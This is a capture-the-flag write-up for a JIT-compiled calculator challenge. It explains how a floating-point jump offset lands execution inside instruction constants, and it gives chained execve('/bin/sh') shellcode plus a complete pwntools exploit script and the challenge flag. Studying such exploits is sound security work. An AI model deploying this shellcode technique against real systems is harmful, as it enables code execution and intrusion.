# Calculator

## Description

```
Hey, I made this JIT compiled calculator! Could you take a look at it and see if it's vulnerable? I left a flag on the server as a reward.
```

## Challenge

Let's see what this executable does, running it gives us

```
1. Add instruction
2. Print instructions
3. Evaluate
Action:
```

when doing static analysis, I noticed that the instructions that you can send with add instruction are in this form `operation llu` where operation is one of `add/sub/xor` then the interesting part is evaluate.

![](images/segfaulteval.png)

we can put in input how many instructions to skip, then the program compiles the instructions jit and executes them.
This is the format of an instruction that is jit compiled

![](images/instruction.png)

The strange thing is that the offset is taken from input as a floating point number, and then is calculated by multiplying 13.0 in floating point.
This means we can also call in the middle of a jit compiled instruction.
From the image above we know that we control 8 bytes inside a jit compiled instruction, starting from the third byte.

By using an offset of 2/13 rounded up, we can jump to the third byte, but in this small space what can we do?
After a bit of tinkering with trying to make a shellcode using registers  like `r12, r13` for intermediate usage and then trying to call syscall I had no luck, I tried to leak something so I could jump somewhere else, but after a while I had the idea, we can chain a shellcode and at the end of every link of the chain we can do a short jump to the next link.
I grabbed this [shellcode](http://shell-storm.org/shellcode/files/shellcode-806.php) and adapted it in links of 6 bytes maximum followed by `jmp $+7` but I had some issues, instructions like `mov rbx, 0xFF978CD091969DD1` take 10 bytes so we can't use them, so I changed some stuff to account for this.
This is the final shellcode separated in links

```assembly
mov ebx, 0xFF978CD0

shl rbx, 32

mov eax, 0x91969DD1

or rbx, rax

xor eax, eax
neg rbx
push rbx

push rsp
pop rdi
cdq
push rdx
push rdi
push rsp

pop rsi
mov al, 0x3b
syscall
```

then using pwntools I assembled each instruction using this function

```python
jmpshort = asm("jmp $+7")

def pad(f):
    return asm(f).ljust(6,b"\x90") + jmpshort
```

basically the same as what I explained before but padding `NOP` instructions so we don't run in any issues and we can keep the same short jump

## Solution
This is the final script

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('calculator')

host = args.HOST or 'localhost'
port = int(args.PORT or 4444)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
break jit
break *jit+542
continue
'''.format(**locals())

# -- Exploit goes here --

def halftrunc(num, n):
    integer = int((num * (10**n) + 1)) / (10**n)
    return float(integer)

jmpshort = asm("jmp $+7")
def pad(f):
    return asm(f).ljust(6,b"\x90") + jmpshort

stages = [
pad("mov ebx, 0xFF978CD0"),
pad("shl rbx, 32"),
pad("mov eax, 0x91969DD1"),
pad("or rbx, rax"),
pad("""
xor eax, eax
neg rbx
push rbx
"""),
pad("""
push rsp
pop rdi
cdq
push rdx
push rdi
push rsp
"""),
pad("""
pop rsi
mov al, 0x3b
syscall
""")
]


multiplier = halftrunc(2/13, 4)

io = start()

for i, x in enumerate(stages):
    io.sendline(b"1")
    inst = b"add " + str(u64(x)).encode()
    # print(inst)
    io.sendline(inst)

io.sendline(b"3")
io.sendline(str(multiplier).encode())


io.interactive()
```

after running this script on the remote server, we get a shell and inside the home there's the flag

`gigem{ju57_1n_71m3_f0r_4_5h3ll!}`